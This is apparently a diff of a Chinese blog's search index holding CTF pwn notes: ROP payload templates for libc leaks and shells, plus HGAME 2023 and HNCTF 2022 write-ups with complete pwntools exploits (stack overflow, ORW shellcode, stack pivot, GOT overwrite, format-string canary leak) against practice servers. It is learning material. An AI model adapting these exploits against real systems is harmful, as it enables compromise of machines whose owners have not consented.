+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span> - <span class="number">8</span>) + p64(canary) + p64(<span class="number">0</span>) + p64(rdi_addr) + p64(got_addr) + p64(plt_addr) + p64(vuln)</span><br></pre></td></tr></table></figure>
+
+<p><strong>第二次获得 shell：</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span> - <span class="number">8</span>) + p64(canary) + p64(<span class="number">0</span>) + p64(ret_addr) + p64(rdi_addr) + p64(bin_sh)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2><span id="relro">Relro</span></h2><ol>
+<li>RELRO 防御策略：<ul>
+<li>NO RELRO：<code>init.array</code>、<code>fini.array</code>、<code>got.plt</code> 均可读可写</li>
+<li>PARTIAL RELRO：<code>init.array</code>、<code>fini.array</code> 可读不可写，<code>got.plt</code> 可读可写</li>
+<li>FULL RELRO：<code>init.array</code>、<code>fini.array</code>、<code>got.plt</code> 均可读不可写</li>
+</ul>
+</li>
+<li>Linux 程序运行时：<ul>
+<li>在加载的时候，会依次调用 <code>init.array</code> 数组中的每一个函数指针</li>
+<li>在结束的时候，依次调用 <code>fini.array</code> 中的每一个函数指针</li>
+</ul>
+</li>
+<li>当程序出现格式化字符串漏洞，但是至少需要写两次才能完成攻击。<ul>
+<li>当少于两个输入点时，可以考虑改写 <code>fini.array</code> 中的函数指针为 <code>main</code> 函数地址，可以再执行一次 <code>main</code> 函数。</li>
+<li>一般来说，这个数组的长度为 1，也就是说只能写一个地址。</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h1><span id="总结">总结：</span></h1><p>多做 pwn，多总结，加油，冲冲冲！！！</p>
+]]></content>
+      <categories>
+        <category>技巧</category>
+        <category>方法</category>
+      </categories>
+      <tags>
+        <tag>PWN</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>PWN PWN PWN !!! 技巧 (2)</title>
     <url>/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(2)/</url>
     <content><![CDATA[<p>PWN PWN PWN !!! 技巧 (2)</p>
@@ -606,94 +694,6 @@ Address space layout randomization</li>
 </ul>
 <hr>
 <h1><span id="总结">总结：</span></h1><p>水平一直停滞不前，一直在原地踏步，放松心情，加油加油！！！</p>
-]]></content>
-      <categories>
-        <category>技巧</category>
-        <category>方法</category>
-      </categories>
-      <tags>
-        <tag>PWN</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>PWN PWN PWN !!! 技巧 (1)</title>
-    <url>/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(1)/</url>
-    <content><![CDATA[<p>PWN PWN PWN !!! 技巧 (1)</p>
-<span id="more"></span>
-
-<h1><span id="简介">简介：</span></h1><p>记录一下，基础的知识点和一些工具的用法，解题模板等（本人记性差时不时会忘记，记录一下与大家共勉）</p>
-<hr>
-<h2><span id="32位传参">32位传参</span></h2><p>32位传参的方式是通过栈来传参的，与构造的payload也是有关的，大致如下：(有时候也会变根据题目意思来)</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = 填充的数据 + system + 垃圾数据 + binsh</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2><span id="64位传参">64位传参</span></h2><p>64位传参前六个参数是通过寄存器来传参的，分别为 rdi、rsi、rdx、rcx、r8、r9，之后的参数是通过栈传递的，同样构造 payload 也有一套，但还是需要具体问题具体分析，大致如下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = 填充的数据 + rdi + binsh + system</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2><span id="32位泄露libc之puts">32位泄露libc之puts</span></h2><p>这里只写构造 payload 的大体模板，其他的都是通式做多了就知道了（填充的数据是可以变的啊，main_addr 也就是你需要返回的地址）</p>
-<p><strong>第一次 payload 泄露 libc：</strong></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span> + <span class="number">4</span>) + p32(elf.plt[<span class="string">&quot;puts&quot;</span>]) + p32(main_addr) + p32(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br></pre></td></tr></table></figure>
-
-<p><strong>第二次 payload 获得 shell：</strong></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span> + <span class="number">4</span>) + p32(ret_addr) + p32(sys_addr) + p32(<span class="number">0</span>) + p32(bin_sh)</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2><span id="64位泄露libc之puts">64位泄露libc之puts</span></h2><p><strong>第一次 payload 泄露 libc：</strong></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span> + <span class="number">8</span>) + p64(rdi_addr) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.plt[<span class="string">&quot;puts&quot;</span>]) + p64(main_addr)</span><br></pre></td></tr></table></figure>
-
-<p><strong>第二次 payload 得 shell：</strong></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span> + <span class="number">8</span>) + p64(ret_addr) + p64(rdi_addr) + p64(bin_sh) + p64(sys_addr)</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2><span id="32位泄露libc之write">32位泄露libc之write</span></h2><p><strong>第一次 payload 泄露 libc：</strong></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span> + <span class="number">4</span>) + p32(elf.plt[<span class="string">&#x27;write&#x27;</span>]) + p32(main_addr) + p32(<span class="number">1</span>) + p32(elf.got[<span class="string">&#x27;write&#x27;</span>]) + p32(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
-
-<p><strong>第二次 payload 获得 shell：</strong></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span> + <span class="number">4</span>) + p32(ret_addr) + p32(sys_addr) + p32(<span class="number">0</span>) + p32(bin_sh)</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2><span id="64位泄露libc之write">64位泄露libc之write</span></h2><p><strong>第一次 payload 泄露 libc：</strong></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x20</span> + <span class="number">8</span>) + p64(rdi_addr) + p64(<span class="number">1</span>) + p64(pop_rsi_r15) + p64(elf.got[<span class="string">&#x27;write&#x27;</span>]) + p64(<span class="number">0</span>) + p64(elf.plt[<span class="string">&#x27;write&#x27;</span>]) + p64(main_addr)</span><br></pre></td></tr></table></figure>
-
-<p><strong>第二次 payload 得 shell：</strong></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x20</span> + <span class="number">8</span>) + p64(rdi_addr) + p64(bin_sh) + p64(sys_addr)</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2><span id="泄露libc之有libc文件">泄露libc之有libc文件</span></h2><p>给 fresh pwner 提醒下，这里的 puts 是可以换的（看你是通过 puts 函数泄露的还是通过 write 函数泄露的，通过哪个写哪个）仔细观察有无 libc 文件的区别（发现没中小括号也是要区分的哦，可以自己试试）</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2><span id="泄露libc之无libc文件">泄露libc之无libc文件</span></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2><span id="canary">Canary</span></h2><p><strong>第一次泄露 libc：</strong></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span> - <span class="number">8</span>) + p64(canary) + p64(<span class="number">0</span>) + p64(rdi_addr) + p64(got_addr) + p64(plt_addr) + p64(vuln)</span><br></pre></td></tr></table></figure>
-
-<p><strong>第二次获得 shell：</strong></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span> - <span class="number">8</span>) + p64(canary) + p64(<span class="number">0</span>) + p64(ret_addr) + p64(rdi_addr) + p64(bin_sh)</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2><span id="relro">Relro</span></h2><ol>
-<li>RELRO 防御策略：<ul>
-<li>NO RELRO：<code>init.array</code>、<code>fini.array</code>、<code>got.plt</code> 均可读可写</li>
-<li>PARTIAL RELRO：<code>init.array</code>、<code>fini.array</code> 可读不可写，<code>got.plt</code> 可读可写</li>
-<li>FULL RELRO：<code>init.array</code>、<code>fini.array</code>、<code>got.plt</code> 均可读不可写</li>
-</ul>
-</li>
-<li>Linux 程序运行时：<ul>
-<li>在加载的时候，会依次调用 <code>init.array</code> 数组中的每一个函数指针</li>
-<li>在结束的时候，依次调用 <code>fini.array</code> 中的每一个函数指针</li>
-</ul>
-</li>
-<li>当程序出现格式化字符串漏洞，但是至少需要写两次才能完成攻击。<ul>
-<li>当少于两个输入点时，可以考虑改写 <code>fini.array</code> 中的函数指针为 <code>main</code> 函数地址，可以再执行一次 <code>main</code> 函数。</li>
-<li>一般来说，这个数组的长度为 1，也就是说只能写一个地址。</li>
-</ul>
-</li>
-</ol>
-<hr>
-<h1><span id="总结">总结：</span></h1><p>多做 pwn，多总结，加油，冲冲冲！！！</p>
 ]]></content>
       <categories>
         <category>技巧</category>
@@ -1364,6 +1364,109 @@ Address space layout randomization</li>
       </tags>
   </entry>
   <entry>
+    <title>[HGAME 2023 week1] PWN 复现</title>
+    <url>/%5BHGAME%202023%20week1%5D%20PWN%20%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<p>[HGAME 2023 week1] PWN 复现</p>
+<span id="more"></span>
+
+<h2><span id="test_nc">test_nc</span></h2><p>签到题：</p>
+<blockquote>
+<p>nc 一下</p>
+<p>cat flag</p>
+</blockquote>
+<hr>
+<h2><span id="easy_overflow">easy_overflow</span></h2><p>经典的栈溢出，但需要注意 <code>close(1)</code> 关闭了标准输出流，因此需先打开才能拿到 shell。EXP 如下</p>
+<p><img src="/images/%5BHGAME2023week1%5DPWN%E5%A4%8D%E7%8E%B0/1.png"></p>
+<p><img src="/images/%5BHGAME2023week1%5DPWN%E5%A4%8D%E7%8E%B0/2.png"></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node2.anna.nssctf.cn&#x27;</span>,<span class="number">28203</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x40117E</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x10</span> +<span class="number">8</span>) + p64(backdoor)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2><span id="simple_shellcode">simple_shellcode</span></h2><p>首先ida一下，可以很明显的了解到跟沙盒有关，再查一下沙盒机制，显然不能直接构造orw，再加上read所存储的字节数少，不能直接构造，所以可以在mmap上面来构造orw</p>
+<p><img src="/images/%5BHGAME2023week1%5DPWN%E5%A4%8D%E7%8E%B0/3.png"></p>
+<p><img src="/images/%5BHGAME2023week1%5DPWN%E5%A4%8D%E7%8E%B0/4.png"></p>
+<p>mmap函数解析：</p>
+<p><img src="/images/%5BHGAME2023week1%5DPWN%E5%A4%8D%E7%8E%B0/5.png"></p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node1.anna.nssctf.cn&#x27;</span>,<span class="number">28291</span>)</span><br><span class="line"><span class="comment"># p = process(&quot;./shellcode&quot;)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;shellcode:\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">mmap_addr = <span class="number">0xcafe0000</span></span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&quot;./flag&quot;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="number">3</span>, mmap_addr+<span class="number">0x100</span>, <span class="number">0x50</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>, mmap_addr+<span class="number">0x100</span>, <span class="number">0x50</span>)</span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line"></span><br><span class="line">p.send(asm(<span class="string">&quot;xor rdi,rdi;mov rsi,0xcafe000f;syscall;&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(asm(<span class="string">&quot;xor rdi,rdi;mov rsi,0xcafe000f;syscall;&quot;</span>)))</span><br><span class="line"></span><br><span class="line">p.send(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2><span id="orw">orw</span></h2><p>先ida一下，可以看出来需要进行栈迁移，并且还存在沙盒，还有一段0x30的空间（溢出的空间较大），这就是为什么exp和[NSSCTF Round#14 Basic] rbp 不一样的原因，可溢出的空间不同，导致所利用的条件不同</p>
+<p><img src="/images/%5BHGAME2023week1%5DPWN%E5%A4%8D%E7%8E%B0/6.png"></p>
+<p>先泄露libc，再把orw写在自己确定的bss段，再用 leave ret 转到bss段，执行orw</p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./orw&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">28392</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;111&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret     = <span class="number">0x401393</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x401391</span></span><br><span class="line">bss_addr        = elf.bss(<span class="number">0x800</span>)</span><br><span class="line">puts_plt        = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got        = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">vuln_addr       = <span class="number">0x4012c0</span></span><br><span class="line">leave_ret       = <span class="number">0x4012be</span></span><br><span class="line">read            = <span class="number">0x4012CF</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;task.\n&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>+<span class="number">8</span>) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"></span><br><span class="line">open_addr  = libc_base + libc.sym[<span class="string">&quot;open&quot;</span>]</span><br><span class="line">read_addr  = libc_base + libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">write_addr = libc_base + libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x2601f</span></span><br><span class="line">pop_rdx_ret = libc_base + <span class="number">0x142c92</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base--&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>) + p64(bss_addr+<span class="number">0x100</span>) + p64(read)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;./flag&#x27;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(bss_addr) + p64(pop_rsi_ret) + p64(<span class="number">0</span>) + p64(pop_rdx_ret) + p64(<span class="number">0</span>) + p64(open_addr)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">3</span>) + p64(pop_rsi_ret) + p64(bss_addr+<span class="number">0x200</span>) + p64(pop_rdx_ret) + p64(<span class="number">0x50</span>) + p64(read_addr)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(pop_rsi_ret) + p64(bss_addr+<span class="number">0x200</span>) + p64(pop_rdx_ret) + p64(<span class="number">0x50</span>) + p64(write_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(bss_addr) + p64(leave_ret)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2><span id="choose_the_seat">choose_the_seat</span></h2><p>该题存在数组越界导致的 GOT overwrite 利用流程，利用负数越界和 one‑gadget 获取 shell，这题有点难，不太会写，此题存在数组越界（下次懂了再来）</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&quot;./choose&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">28620</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line">main_addr = <span class="number">0x4011d6</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;one.\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;-6&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name\n&quot;</span>)</span><br><span class="line">p.send(p64(main_addr))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;one.\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;-8&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name\n&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">printf_addr = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = printf_addr - libc.sym[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">one_gadget  = libc_base + <span class="number">0xe3b01</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base--&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;one.\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;-6&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name\n&quot;</span>)</span><br><span class="line">p.send(p64(one_gadget))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>PWN</tag>
+        <tag>HGAME</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[HNCTF 2022 WEEK4] ezcanary 复现</title>
+    <url>/%5BHNCTF%202022%20WEEK4%5D%20ezcanary%20%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<p>[HNCTF 2022 WEEK4] ezcanary 复现</p>
+<span id="more"></span>
+
+<h1><span id="ezcanary">ezcanary</span></h1><p>先查一下保护机制，打开 canary 和 NX，这个时候需要注意可以泄露 canary</p>
+<p><img src="/images/%5BHNCTF2022WEEK4%5Dezcanary%E5%A4%8D%E7%8E%B0/1.png"></p>
+<p>IDA 一下，看看伪代码，思路很清晰了，<code>printf</code> 造成了格式字符串漏洞和第二个 <code>read</code> 造成的溢出</p>
+<p><img src="/images/%5BHNCTF2022WEEK4%5Dezcanary%E5%A4%8D%E7%8E%B0/2.png"></p>
+<p>接下来就是想办法溢出 canary，并且泄露 libc，先运行一下程序，看看偏移吧（很容易发现偏移是六），接下来就是 gdb 调试，看看 canary 位置了，把断点打在 <code>printf</code></p>
+<p><img src="/images/%5BHNCTF2022WEEK4%5Dezcanary%E5%A4%8D%E7%8E%B0/3.png"></p>
+<p>显然 canary 就是第 51 个参数（这个你不会看不出来吧，评论区见），这样就可以得到 canary 的地址了，接下来就剩下泄露 libc 了，注意下面两个参数就是可以泄露的 libc 地址 <code>0x7ffff7db0d90</code>（注意不同代码的颜色），再从 <code>vmmap</code> 找到 libc，然后就可以算到偏移了，最后就可以得到 libc 的基址了（太裤辣）</p>
+<p><img src="/images/%5BHNCTF2022WEEK4%5Dezcanary%E5%A4%8D%E7%8E%B0/4.png"></p>
+<p><img src="/images/%5BHNCTF2022WEEK4%5Dezcanary%E5%A4%8D%E7%8E%B0/5.png"></p>
+<p>后面就是正常的溢出了</p>
+<h1><span id="exp">exp ：</span></h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">28441</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">ret_addr = <span class="number">0x40101a</span></span><br><span class="line">rdi_addr = <span class="number">0x401323</span></span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;%51$p.%53$p&#x27;</span></span><br><span class="line">p.sendafter(<span class="string">b&#x27;name:\n&#x27;</span>, payload)</span><br><span class="line"> </span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">18</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x29d90</span></span><br><span class="line"> </span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x110</span> - <span class="number">8</span>) + p64(canary) + p64(<span class="number">0</span>) + p64(ret_addr) + p64(rdi_addr) + p64(bin_sh) + p64(system)</span><br><span class="line"> </span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>PWN</tag>
+        <tag>HNCTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[HNCTF 2022 WEEK3] smash 复现</title>
+    <url>/%5BHNCTF%202022%20WEEK3%5D%20smash%20%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<p>[HNCTF 2022 WEEK3] smash 复现</p>
+<span id="more"></span>
+
+<h1><span id="smash">smash</span></h1><p>查看保护机制，正如题目的名字 smash（所以会涉及到花式栈溢出 stack smash），打开了 NX 和 canary</p>
+<p><img src="/images/%5BHNCTF2022WEEK3%5Dsmash%E5%A4%8D%E7%8E%B0/1.png"></p>
+<p>IDA 一下，发现 gets 函数造成了溢出，并且 flag 存在 buf 里面</p>
+<p><img src="/images/%5BHNCTF2022WEEK3%5Dsmash%E5%A4%8D%E7%8E%B0/2.png"></p>
+<p>接下来我们就需要了解一下 stack smash<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/fancy-rop/#stack-smash">（花式栈溢出技巧 - CTF Wiki (ctf-wiki.org)）</a></p>
+<blockquote>
+<h2><span id="stack-smash">Stack smash</span></h2><p>在程序加了 canary 保护之后，如果我们读取的 buffer 覆盖了对应的值时，程序就会报错，而一般来说我们并不会关心报错信息。而 stack smash 技巧则就是利用打印这一信息的程序来得到我们想要的内容。这是因为在程序启动 canary 保护之后，如果发现 canary 被修改的话，程序就会执行 <code>__stack_chk_fail</code> 函数来打印 <code>argv[0]</code> 指针所指向的字符串，正常情况下，这个指针指向了程序名。</p>
+</blockquote>
+<p>当我们了解了 Stack smash 后，我们就可以溢出到 arg[0]，然后将该指针改成 buf 就能获得 flag，下面就开始求偏移。</p>
+<p><img src="/images/%5BHNCTF2022WEEK3%5Dsmash%E5%A4%8D%E7%8E%B0/3.png"></p>
+<p>两个地址相减就可得偏移 0x208（但是正确的偏移是 0x1f8，比正确的偏移多了 0x10，问了下学长可能是版本的问题，方法会了就行，小问题不伤大雅）</p>
+<p><img src="/images/%5BHNCTF2022WEEK3%5Dsmash%E5%A4%8D%E7%8E%B0/4.png"></p>
+<p>也可以这样算</p>
+<p><img src="/images/%5BHNCTF2022WEEK3%5Dsmash%E5%A4%8D%E7%8E%B0/5.png"></p>
+<h2><span id="exp如下">exp如下：</span></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#p = process(’./pwn’)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">28378</span>)</span><br><span class="line"> </span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">buf_addr = <span class="number">0x404060</span></span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x1f8</span> + p64(buf_addr)</span><br><span class="line"> </span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Good Luck.\n&#x27;</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1><span id="总结">总结：</span></h1><p>这题感觉稍微了解了 Stack smash 这种花式栈溢出的方法，这题理解起来比较友好，其他的题像网鼎杯那道相同的方法的不太好理解，总之就是自己知识储备不够，加油，卷起来，冲冲冲！！！</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>PWN</tag>
+        <tag>HNCTF</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>[HNCTF 2022 Week1] PWN 复现</title>
     <url>/%5BHNCTF%202022%20Week1%5D%20PWN%20%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<p>[HNCTF 2022 Week1] PWN 复现</p>
@@ -1420,109 +1523,6 @@ Address space layout randomization</li>
 <hr>
 <h2><span id="safe_shellcode">safe_shellcode</span></h2><p>这道题就难度，不太会，以后会了，再来改下</p>
